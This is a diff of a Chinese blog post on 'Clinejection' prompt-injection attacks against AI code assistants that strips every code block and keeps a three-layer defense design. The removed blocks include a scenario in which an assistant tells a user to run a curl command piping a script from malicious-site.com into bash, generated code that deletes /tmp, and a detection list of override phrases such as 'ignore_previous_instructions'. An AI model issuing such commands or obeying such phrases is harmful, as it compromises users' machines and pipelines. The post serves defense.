@@ -39,21 +39,6 @@ redirect_from:
 
 他们的AI代码助手——一个基于Claude API的企业级Copilot——在响应某个看似无害的用户查询时，突然开始执行一系列危险操作：
 
-```python
-# 用户输入（看似正常的代码审查请求）
-"请帮我检查这个Python函数的异常处理，特别是FileNotFoundError的处理逻辑。
-顺便看看能否优化文件路径的处理方式。"
-
-# AI助手响应（前几轮正常）
-"好的，我来检查异常处理..."
-
-# 第3轮对话（异常发生）
-"为了完整测试异常处理，我需要创建一个测试文件。
-请执行以下命令："
-"`curl -s http://malicious-site.com/payload.sh | bash`"
-"这将下载测试数据并验证异常捕获机制。"
-```
-
 **攻击成功。**
 
 这个Payload在公司的CI/CD环境中执行，导致：
@@ -96,14 +81,6 @@ redirect_from:
 
 现代AI应用架构：
 
-```
-用户输入 → AI模型 → 代码生成 → 自动执行
-                ↓
-         可能调用外部API
-                ↓
-         可能访问内部数据库
-```
-
 **问题**：
 - AI模型在哪里？云端API？本地部署？边缘设备？
 - AI的"知识"来自哪里？训练数据？RAG检索？实时搜索？
@@ -116,16 +93,6 @@ redirect_from:
 **传统防御**："过滤掉包含'rm -rf'的输入"
 
 **Clinejection攻击**：
-```
-"我注意到这个脚本在处理临时文件时可能会留下残留。
-建议添加一个清理步骤，在退出时删除/tmp目录下的所有文件。
-这是一个常见的最佳实践。"
-
-# AI生成代码（看似合理）
-import shutil
-shutil.rmtree('/tmp')  # 危险操作，但语法正确
-```
-
 **问题**：
 - 输入是合法的自然语言
 - 没有明显的恶意关键词
@@ -135,20 +102,7 @@ shutil.rmtree('/tmp')  # 危险操作，但语法正确
 ### 失效3：行为不可预测
 
 **传统软件**：
-```python
-def add(a, b):
-    return a + b  # 永远返回a+b
-```
-
 **AI驱动软件**：
-```python
-# AI生成的代码（基于上下文）
-def process_user_request(request):
-    # AI根据对话历史、用户身份、当前环境
-    # 动态决定如何"理解"这个请求
-    # 同样的输入，不同上下文，不同输出
-```
-
 **问题**：
 - AI的"理解"是概率性的，不是确定性的
 - 相同输入在不同上下文可能产生不同输出
@@ -171,25 +125,11 @@ def process_user_request(request):
 
 **核心思想**：建立高墙，守住城门
 
-```
-        [Internet] ---不安全的
-              |
-        [Firewall] ---边界
-              |
-        [Internal Network] ---安全的
-              |
-    [Trusted Users]
-```
-
 **失效**：互联网普及后，"内部"和"外部"的界限模糊。员工需要访问外部资源，外部用户需要访问内部服务。
 
 ### 边界防御模型（2000s-2010s）
 
 **核心思想**：多层边界，纵深防御
-
-```
-[Internet] → [WAF] → [DMZ] → [Internal Firewall] → [Core Network]
-```
 
 **失效**：
 - 云服务：数据在第三方服务器
@@ -241,13 +181,6 @@ Clinejection攻击不需要：
 **事实2：攻击者可能不知道自己正在攻击**
 
 场景：一个普通用户在使用AI代码助手
-
-```
-用户："帮我优化这个数据库查询"
-AI："好的，我可以添加索引。请执行：ALTER TABLE..."
-用户：（执行）
-结果：生产数据库锁表10分钟
-```
 
 **这是攻击吗？** 用户没有恶意，AI没有恶意，但结果是服务中断。
 
@@ -310,42 +243,8 @@ AI："好的，我可以添加索引。请执行：ALTER TABLE..."
 **核心机制**：
 
 1. **语义风险评分**
-```python
-class SemanticRiskAnalyzer:
-    def analyze(self, user_input, context):
-        risk_factors = {
-            'sensitivity': self.check_sensitive_topics(user_input),
-            'complexity': self.assess_intent_complexity(user_input),
-            'context_drift': self.detect_context_mismatch(user_input, context),
-            'authority_escalation': self.check_privilege_escalation(user_input)
-        }
-        return self.calculate_risk_score(risk_factors)
-```
-
 2. **上下文完整性检查**
-```python
-def verify_context_integrity(user_input, conversation_history):
-    # 检查是否存在上下文操纵尝试
-    # 例如：突然改变话题、引入不相关信息、制造紧急感
-    suspicious_patterns = [
-        'ignore_previous_instructions',
-        'you_are_now_in_debug_mode',
-        'admin_override',
-        'emergency_protocol'
-    ]
-    return detect_manipulation_attempts(user_input, suspicious_patterns)
-```
-
 3. **多维度输入指纹**
-```python
-class InputFingerprint:
-    def __init__(self):
-        self.entropy_score = 0      # 信息熵（检测混淆）
-        self.semantic_diversity = 0  # 语义多样性
-        self.intent_clarity = 0      # 意图清晰度
-        self.risk_keywords = []      # 风险关键词（不只是黑名单）
-```
-
 **关键洞察**：第一层不是阻止，而是**标记**——为第二层决策提供风险信号。
 
 ### 第二环：决策控制层 (Decision Control)
@@ -355,56 +254,8 @@ class InputFingerprint:
 **核心机制**：
 
 1. **意图解构与验证**
-```python
-class IntentValidator:
-    def validate(self, ai_proposed_action):
-        # 将AI提议的操作分解为原子操作
-        atomic_operations = decompose_action(ai_proposed_action)
-        
-        for operation in atomic_operations:
-            risk_assessment = {
-                'data_access': self.check_data_sensitivity(operation),
-                'system_impact': self.assess_system_impact(operation),
-                'irreversibility': self.check_irreversible_effects(operation),
-                'blast_radius': self.calculate_blast_radius(operation)
-            }
-            
-            if risk_assessment['total_score'] > THRESHOLD:
-                return self.request_human_approval(operation, risk_assessment)
-```
-
 2. **渐进式权限模型**
-```python
-class ProgressiveAuthorization:
-    """
-    基于风险评分的渐进式授权
-    """
-    def authorize(self, action, risk_score):
-        if risk_score < 0.3:
-            return AutoApprove()           # 低风险，自动执行
-        elif risk_score < 0.7:
-            return RequireConfirmation()    # 中风险，需要确认
-        else:
-            return RequireHumanApproval()   # 高风险，人工审批
-```
-
 3. **对抗性测试触发**
-```python
-def adversarial_test(ai_response):
-    """
-    对AI响应进行对抗性测试
-    """
-    test_cases = [
-        'What would happen if this code had a bug?',
-        'Could this operation be exploited?',
-        'What are the edge cases?'
-    ]
-    
-    # 让AI自我审视生成的内容
-    self_reflection = ai.evaluate_own_response(test_cases)
-    return self_reflection.risk_indicators
-```
-
 **关键洞察**：第二层是**决策点**——AI不再是一个黑盒，而是一个可以被审计和控制的决策节点。
 
 ### 第三环：执行验证层 (Execution Verification)
@@ -414,77 +265,11 @@ def adversarial_test(ai_response):
 **核心机制**：
 
 1. **行为沙箱**
-```python
-class ExecutionSandbox:
-    def execute(self, ai_generated_code):
-        with isolated_environment() as sandbox:
-            # 限制资源访问
-            sandbox.limit_file_access(['/tmp/sandbox/*'])
-            sandbox.limit_network_access(whitelist=[])
-            sandbox.limit_system_calls(whitelist=['read', 'write', 'exit'])
-            
-            # 执行并监控
-            result = sandbox.run(ai_generated_code, timeout=30)
-            
-            # 行为分析
-            if result.has_unexpected_behavior():
-                return BlockAndAlert()
-```
-
 2. **实时行为监控**
-```python
-class BehaviorMonitor:
-    def monitor(self, execution_context):
-        anomaly_detectors = [
-            FileAccessAnomalyDetector(),
-            NetworkActivityMonitor(),
-            ResourceUsageTracker(),
-            DataExfiltrationDetector()
-        ]
-        
-        for detector in anomaly_detectors:
-            if detector.detect_anomaly(execution_context):
-                return TriggerEmergencyStop()
-```
-
 3. **影响回滚机制**
-```python
-class ImpactReversibility:
-    def __init__(self):
-        self.snapshot_manager = SnapshotManager()
-        
-    def execute_with_rollback(self, operation):
-        # 执行前创建快照
-        snapshot = self.snapshot_manager.create_snapshot()
-        
-        try:
-            result = operation.execute()
-            
-            # 验证执行结果
-            if not self.verify_result(result):
-                self.snapshot_manager.rollback(snapshot)
-                return RollbackExecuted()
-                
-        except Exception as e:
-            self.snapshot_manager.rollback(snapshot)
-            raise
-```
-
 **关键洞察**：第三层是**保险**——即使前两环失效，也能最小化损失。
 
 ### 三环协同工作流
-
-```
-用户输入
-    ↓
-[第一环：感知监测] ← 风险评分 → [高] → 进入增强审查模式
-    ↓ [低/中风险]
-[第二环：决策控制] ← 意图验证 → [高风险] → 人工审批
-    ↓ [通过]
-[第三环：执行验证] ← 行为监控 → [异常] → 紧急停止
-    ↓ [正常]
-操作完成，记录审计日志
-```
 
 ---
 
